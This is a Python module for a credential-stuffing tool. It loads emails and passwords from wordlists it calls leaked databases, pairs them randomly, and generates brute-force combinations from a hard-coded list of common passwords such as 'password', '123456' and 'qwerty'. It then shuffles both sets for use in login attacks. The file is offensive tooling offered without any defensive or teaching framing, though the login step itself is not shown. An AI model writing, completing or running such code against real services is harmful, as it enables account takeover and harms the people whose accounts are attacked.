#!/usr/bin/env python3
"""
Credential Stuffer for loading and generating credentials
"""

import random
import string
import aiofiles
import logging
from typing import List, Dict
from pathlib import Path

logger = logging.getLogger(__name__)


class CredentialStuffer:
    """Handles credential loading and generation"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.wordlist_dir = Path('config/wordlists')
    
    async def load_leaked_credentials(self) -> List[Dict]:
        """Load credentials from leaked databases"""
        
        credentials = []
        
        # Load emails
        emails = await self._load_wordlist('emails.txt')
        
        # Load passwords
        passwords = await self._load_wordlist('passwords.txt')
        
        # Combine them
        for email in emails:
            # Use same password for multiple emails (common breach pattern)
            for _ in range(min(3, len(passwords))):
                password = random.choice(passwords)
                credentials.append({
                    'email': email,
                    'password': password
                })
        
        logger.info(f"Loaded {len(credentials)} leaked credentials")
        return credentials
    
    async def generate_brute_force_credentials(self) -> List[Dict]:
        """Generate brute force combinations"""
        
        credentials = []
        base_emails = await self._load_wordlist('emails.txt')
        
        # Common passwords
        common_passwords = [
            'password', '123456', 'qwerty', 'abc123', 'monkey',
            'master', 'dragon', '111111', 'baseball', 'iloveyou',
            'trustno1', 'sunshine', 'princess', 'football', 'charlie'
        ]
        
        for email in base_emails[:1000]:  # Limit for brute force
            for password in common_passwords:
                credentials.append({
                    'email': email,
                    'password': password
                })
        
        logger.info(f"Generated {len(credentials)} brute force credentials")
        return credentials
    
    async def load_mixed_credentials(self) -> List[Dict]:
        """Load mixed credentials (leaked + generated)"""
        
        leaked = await self.load_leaked_credentials()
        brute = await self.generate_brute_force_credentials()
        
        combined = leaked + brute
        random.shuffle(combined)
        
        logger.info(f"Loaded {len(combined)} mixed credentials")
        return combined
    
    async def _load_wordlist(self, filename: str) -> List[str]:
        """Load wordlist from file"""
        
        filepath = self.wordlist_dir / filename
        
        if not filepath.exists():
            logger.warning(f"Wordlist not found: {filepath}")
            return []
        
        try:
            async with aiofiles.open(filepath, 'r') as f:
                content = await f.read()
                lines = [line.strip() for line in content.split('\n') if line.strip()]
                return lines
        except Exception as e:
            logger.error(f"Error loading wordlist: {str(e)}")
            return []
